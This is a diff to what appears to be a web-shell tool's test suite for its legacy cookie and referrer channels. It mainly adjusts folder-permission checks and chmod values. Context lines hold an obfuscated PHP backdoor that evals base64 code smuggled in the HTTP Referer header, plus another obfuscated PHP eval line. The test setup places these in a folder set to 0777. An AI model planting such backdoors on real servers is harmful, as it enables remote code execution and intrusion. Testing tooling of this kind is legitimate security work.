@@ -1,5 +1,6 @@
 from testsuite.base_test import BaseTest
 from core.channels.channel import Channel
+from core.weexceptions import DevException
 import utils
 from testsuite.config import script_folder, script_folder_url, test_stress_channels
 from core.generate import generate, save_generated
@@ -136,15 +137,17 @@ class LegacyCookieChannel(BaseTest):
         cls._randomize_bd()
         cls.password = 'asdasd'
 
-        # Check `config.script_folder` permissions
+        # Check `config.script_folder` permissions, comparing just the 
+        # last 3 digits
+
         if (
             subprocess.check_output(
                 config.cmd_env_stat_permissions_s % (config.script_folder),
-                shell=True).strip()
-            != config.script_folder_expected_perms
+                shell=True).strip()[-3:]
+            != config.script_folder_expected_perms[-3:]
             ):
             raise DevException(
-                "Error: give to the http user full permissions to the folder \'%s\'"
+                "Error: give the required permissions to the folder \'%s\'"
                 % config.script_folder
             )
 
@@ -166,7 +169,7 @@ $sify = $fyqt('', $apod($toja("eo", "", $dqlt.$tylz.$xcrd.$lspg))); $sify();
             shell=True)
 
         subprocess.check_call(
-            config.cmd_env_chmod_s_s % ('777', cls.path),
+            config.cmd_env_chmod_s_s % ('0777', cls.path),
             shell=True)
 
     @classmethod
@@ -242,17 +245,20 @@ class LegacyReferrerChannel(BaseTest):
         cls._randomize_bd()
         cls.password = 'asdasd'
 
-        # Check `config.script_folder` permissions
+        # Check `config.script_folder` permissions, comparing just the 
+        # last 3 digits
+
         if (
             subprocess.check_output(
                 config.cmd_env_stat_permissions_s % (config.script_folder),
-                shell=True).strip()
-            != config.script_folder_expected_perms
+                shell=True).strip()[-3:]
+            != config.script_folder_expected_perms[-3:]
             ):
             raise DevException(
-                "Error: give to the http user full permissions to the folder \'%s\'"
+                "Error: give the required permissions to the folder \'%s\'"
                 % config.script_folder
             )
+
 
         obfuscated = """<?php eval(base64_decode('cGFyc2Vfc3RyKCRfU0VSVkVSWydIVFRQX1JFRkVSRVInXSwkYSk7IGlmKHJlc2V0KCRhKT09J2FzJyAmJiBjb3VudCgkYSk9PTkpIHsgZWNobyAnPGRhc2Q+JztldmFsKGJhc2U2NF9kZWNvZGUoc3RyX3JlcGxhY2UoIiAiLCAiKyIsIGpvaW4oYXJyYXlfc2xpY2UoJGEsY291bnQoJGEpLTMpKSkpKTtlY2hvICc8L2Rhc2Q+Jzt9')); ?>"""
 
@@ -263,7 +269,7 @@ class LegacyReferrerChannel(BaseTest):
             shell=True)
 
         subprocess.check_call(
-            config.cmd_env_chmod_s_s % ('777', cls.path),
+            config.cmd_env_chmod_s_s % ('0777', cls.path),
             shell=True)
 
     @classmethod
